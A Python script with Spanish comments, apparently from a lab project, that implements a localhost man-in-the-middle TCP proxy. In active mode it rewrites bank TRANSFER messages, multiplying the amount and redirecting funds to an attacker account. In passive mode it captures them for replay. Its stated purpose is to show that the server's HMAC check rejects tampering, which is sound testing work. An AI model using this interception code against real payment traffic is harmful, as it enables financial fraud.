# Ataque Man-in-the-Middle: proxy TCP que altera el importe de las transferencias en tránsito.
"""
Se pone en medio: el cliente se conecta al proxy (5001) y el proxy reenvía al servidor (5000).

    python -m ataques.mitm_proxy            modo activo: cambia importe y destino de cada TRANSFER
    python -m ataques.mitm_proxy --pasivo   no toca nada, pero copia cada TRANSFER en
                                            evidencias/logs/capturadas.jsonl (para ataques/replay.py)
    python -m cliente.interfaz 127.0.0.1 5001

Resultado esperado en modo activo: el servidor responde "MAC inválido" y no registra nada.
"""
import json
import socket
import sys
import threading
from pathlib import Path

ESCUCHA, SERVIDOR = ("127.0.0.1", 5001), ("127.0.0.1", 5000)
PASIVO = "--pasivo" in sys.argv
CAPTURAS = Path(__file__).resolve().parent.parent / "evidencias" / "logs" / "capturadas.jsonl"
CUENTA_ATACANTE = "ES6600000000000000000666"


def alterar(linea: bytes) -> bytes:
    try:
        msg = json.loads(linea)
    except ValueError:
        return linea
    if not (isinstance(msg, dict) and msg.get("action") == "TRANSFER"):
        return linea
    if PASIVO:
        CAPTURAS.parent.mkdir(parents=True, exist_ok=True)
        with CAPTURAS.open("ab") as f:
            f.write(linea)
        print(f"[MitM] TRANSFER capturada sin tocar -> {CAPTURAS.name}")
        return linea
    p = msg["payload"]
    print(f"[MitM] {p['amount']} EUR a {p['destination_account']}  ==>  {p['amount'] * 100} EUR a {CUENTA_ATACANTE}")
    p["amount"] *= 100
    p["destination_account"] = CUENTA_ATACANTE
    return json.dumps(msg).encode() + b"\n"  # el hmac se deja igual: sin la clave no se puede recalcular


def tubo(origen, destino, cambiar):
    try:
        for linea in origen.makefile("rb"):
            destino.sendall(cambiar(linea))
    except OSError:
        pass
    finally:  # si un lado se cierra, se cierran los dos
        origen.close()
        destino.close()


def main():
    escucha = socket.create_server(ESCUCHA)
    print(f"[MitM] {'PASIVO' if PASIVO else 'ACTIVO'} escuchando en {ESCUCHA[0]}:{ESCUCHA[1]} -> {SERVIDOR[0]}:{SERVIDOR[1]}")
    try:
        while True:
            cliente, _ = escucha.accept()
            servidor = socket.create_connection(SERVIDOR)
            threading.Thread(target=tubo, args=(cliente, servidor, alterar), daemon=True).start()
            threading.Thread(target=tubo, args=(servidor, cliente, lambda l: l), daemon=True).start()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
